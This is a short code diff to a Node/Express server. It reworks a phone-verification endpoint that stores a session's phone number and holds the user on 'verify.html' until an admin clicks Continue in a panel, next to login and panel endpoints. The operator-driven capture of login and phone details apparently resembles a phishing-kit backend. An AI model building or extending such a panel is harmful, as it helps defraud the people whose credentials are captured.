@@ -179,17 +179,25 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-/*  phone verify  */
+/*  phone verify (NEW FLOW)  */
 app.post('/api/verify', async (req, res) => {
   try {
     const { sid, phone } = req.body;
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.phone = phone; v.page = 'verify.html'; v.status = 'wait';
+
+    // 1. store phone
+    v.phone = phone;
+    v.status = 'wait';   // waiting for ADMIN to click ✅
     sessionActivity.set(sid, Date.now());
+
+    // 2. update audit log
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
+
+    // 3. refresh panel
+    //    (page stays 'verify.html' until admin Continue)
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
@@ -309,4 +317,5 @@ app.post('/api/panel', async (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN || `http://localhost:${PORT}`;
+
 });
